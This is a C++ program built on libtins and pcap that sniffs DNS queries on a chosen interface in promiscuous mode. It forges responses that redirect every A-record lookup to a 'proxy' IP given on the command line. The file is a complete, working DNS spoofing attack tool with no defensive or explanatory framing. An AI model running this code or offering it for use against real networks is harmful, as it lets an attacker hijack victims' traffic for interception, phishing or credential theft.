#include <tins/tins.h>
#include <iostream>
#include <pcap.h>
#include <arpa/inet.h>
#include <string>

using namespace Tins;
using namespace std;

void Call_Device(char **C_dev);
char *dev;
pcap_if_t *alldevs;
pcap_if_t *d;
int i=0;
char buf[65000];
char Select_device[10];
char errbuf[PCAP_ERRBUF_SIZE];
PacketSender sender;

int main(int argc, char *argv[])
{

    if(argc < 2)
    {
        printf("ex) ./[File Name] [Proxy Ip]\n");
        return 1;
    }

    if (pcap_findalldevs(&alldevs, errbuf) == -1)
        fprintf(stderr,"Error in pcap_findalldevs: %s\n", errbuf);

    for(d=alldevs;d;d=d->next)
        printf("%d. %s \n", ++i, d->name);

    if(i==0)
        printf("\nNo interfaces found! Make sure WinPcap is installed.\n");

    printf("\nSelect Device: ");
    scanf("%s",&Select_device);
    dev = Select_device;
    system("clear");

    // libtins

    SnifferConfiguration config;
    //SnifferConfiguration :: set_immediate_mode
    config.set_immediate_mode(true);
    config.set_promisc_mode(true);
    config.set_filter("udp and dst port 53"); //dst port 53
    Sniffer sniffer(dev,config);
    sender.default_interface(dev);

    while(Packet pkt = sniffer.next_packet())
    {
        EthernetII eth = pkt.pdu()->rfind_pdu<EthernetII>();
        IP ip = eth.rfind_pdu<IP>();
        UDP udp = ip.rfind_pdu<UDP>();
        DNS dns = udp.rfind_pdu<RawPDU>().to<DNS>();

        EthernetII spoof_eth;
        IP spoof_ip;
        UDP spoof_udp;
        DNS spoof_dns;

        if (dns.type() == DNS::QUERY)
        {
            for (const auto& query : dns.queries())
            {
                if (query.query_type() == DNS::A)
                {
                    spoof_eth.dst_addr(eth.src_addr()); // spoof_eth.dst_addr --> Gate addr
                    spoof_eth.src_addr(eth.dst_addr()); //spoof_eth.src_addr --> My addr
                    spoof_eth.payload_type(eth.payload_type());

                    //cout<<hex<<spoof_eth.dst_addr()<<"\n";
                    //cout<<hex<<spoof_eth.src_addr()<<"\n";
                    //cout<<hex<<spoof_eth.payload_type()<<"\n";

                    spoof_ip = ip;

                    spoof_ip.src_addr(ip.dst_addr()); // spoof_ip.src_addr --> DNS server addr
                    spoof_ip.dst_addr(ip.src_addr()); // spoof_ip.dst_addr --> My addr
                    //spoof_ip.id(0);
                    //spoof_ip.ttl(64);

                    //cout<<hex<<spoof_ip.src_addr()<<"\n";
                    //cout<<hex<<spoof_ip.dst_addr()<<"\n";

                    spoof_udp = udp;

                    spoof_udp.sport(udp.dport()); // spoof_udp.sport --> 53
                    spoof_udp.dport(udp.sport()); // spoof_udp.dport --> My port

                    //cout<<spoof_udp.sport()<<"\n";
                    //cout<<spoof_udp.dport()<<"\n";

                    spoof_dns = dns;

                    spoof_dns.add_answer(DNS::Resource(query.dname(),argv[1],DNS::CNAME,query.query_class(),777));

                    //cout<<spoof_dns.answers_count()<<"\n";
                   // cout<<query.dname()<<"\n";

                    if (spoof_dns.answers_count() > 0)
                    {
                        cout<<"[Domain Name]: "<<query.dname()<<"\n[Send to Proxy Server]: "<<"("<<argv[1]<<")"<<"\n\n";
                        spoof_dns.type(DNS::RESPONSE);

                        spoof_dns.recursion_available(1);

                        auto Spoof_Dns_Packet = EthernetII(spoof_eth.dst_addr(),spoof_eth.src_addr()) / IP(spoof_ip.dst_addr(),spoof_ip.src_addr()) / UDP(spoof_udp.dport(),spoof_udp.sport()) / spoof_dns;

                        sender.send(Spoof_Dns_Packet);
                    }
                }
            }
        }
    }
}

